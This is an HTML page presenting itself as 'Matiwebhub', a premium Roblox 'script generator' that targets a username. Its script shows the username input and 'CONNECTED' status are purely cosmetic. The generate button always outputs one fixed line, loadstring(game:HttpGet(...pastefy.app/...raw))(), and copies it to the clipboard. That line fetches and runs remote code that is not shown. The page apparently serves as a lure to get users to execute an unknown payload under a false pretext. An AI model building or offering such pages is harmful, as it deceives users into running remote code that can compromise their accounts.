<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matiwebhub | Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0a0a0c; color: #fff; font-family: sans-serif; }
        .panel { background: #121217; border: 1px solid #1f1f27; }
        .input-dark { background: #1c1c24; border: 1px solid #2d2d39; color: white; }
        .btn-blue { background: #4f46e5; font-weight: bold; transition: 0.3s; }
        .btn-blue:disabled { background: #1c1c24; color: #444; opacity: 0.6; }
        .scan-line { width: 100%; height: 2px; background: #4f46e5; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 10px #4f46e5; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body class="p-4 flex justify-center min-h-screen">
    <div class="max-w-md w-full space-y-6">
        
        <div class="flex flex-col items-center space-y-3">
            <div class="bg-green-500/10 text-green-500 border border-green-500/20 px-3 py-1 rounded-full text-[10px] font-bold flex items-center gap-2">
                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                LIVE · Script Generator Online
            </div>
            <h1 class="text-4xl font-black italic uppercase text-white tracking-tighter">MATIWEBHUB</h1>
            <p class="text-center text-gray-400 text-[11px] px-6">
                Premium automated script generation for your Roblox targets — fast, secure, and ready to deploy.
            </p>
        </div>

        <div class="panel p-6 rounded-2xl space-y-4">
            <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Roblox Username</label>
            <input type="text" id="userInput" oninput="updateUI()" placeholder="Enter username..." 
                   class="w-full p-4 rounded-xl input-dark text-sm outline-none">
            
            <div id="profileBox" class="hidden">
                <div onclick="activate()" class="relative flex items-center space-x-4 p-4 border border-indigo-500 bg-indigo-500/10 rounded-xl cursor-pointer overflow-hidden">
                    <div class="scan-line"></div>
                    <div class="w-12 h-12 rounded-full bg-indigo-900/40 flex items-center justify-center border border-indigo-500/30 text-xl">👤</div>
                    <div>
                        <p id="targetName" class="text-sm font-bold text-white"></p>
                        <p id="statusText" class="text-[9px] text-indigo-400 font-bold uppercase">TARGET IDENTIFIED · TAP TO SYNC</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="space-y-3">
            <button id="freezeBtn" disabled class="w-full p-4 rounded-xl bg-gray-800 text-[11px] font-black uppercase text-gray-500 transition-all">
                SCRIPT FREEZE
            </button>
            <button id="genBtn" onclick="generate()" disabled class="w-full p-5 rounded-xl btn-blue text-[12px] font-black uppercase tracking-widest shadow-lg shadow-indigo-500/20">
                GENERATE SCRIPT
            </button>
        </div>

        <div id="output" class="hidden panel p-5 rounded-2xl border-indigo-500/30 bg-black/50 backdrop-blur">
            <p class="text-[9px] text-indigo-500 mb-3 font-bold uppercase">GENERATED PAYLOAD:</p>
            <code id="scriptCode" class="text-[10px] break-all text-indigo-200 font-mono"></code>
        </div>
    </div>

    <script>
        function updateUI() {
            const user = document.getElementById('userInput').value;
            const box = document.getElementById('profileBox');
            document.getElementById('targetName').textContent = user;
            if(user.length > 2) { box.classList.remove('hidden'); }
            else { box.classList.add('hidden'); }
        }

        function activate() {
            const fBtn = document.getElementById('freezeBtn');
            const gBtn = document.getElementById('genBtn');
            const status = document.getElementById('statusText');
            
            status.textContent = "CONNECTED ✅";
            fBtn.disabled = false;
            fBtn.classList.replace('bg-gray-800', 'bg-indigo-900');
            fBtn.classList.replace('text-gray-500', 'text-white');
            gBtn.disabled = false;
        }

        function generate() {
            const code = 'loadstring(game:HttpGet("https://pastefy.app/e8DClYOX/raw"))()';
            document.getElementById('scriptCode').textContent = code;
            document.getElementById('output').classList.remove('hidden');
            
            const btn = document.getElementById('genBtn');
            btn.textContent = "COPIED TO CLIPBOARD!";
            navigator.clipboard.writeText(code);
            setTimeout(() => { btn.textContent = "GENERATE SCRIPT"; }, 2000);
        }
    </script>
</body>
</html>
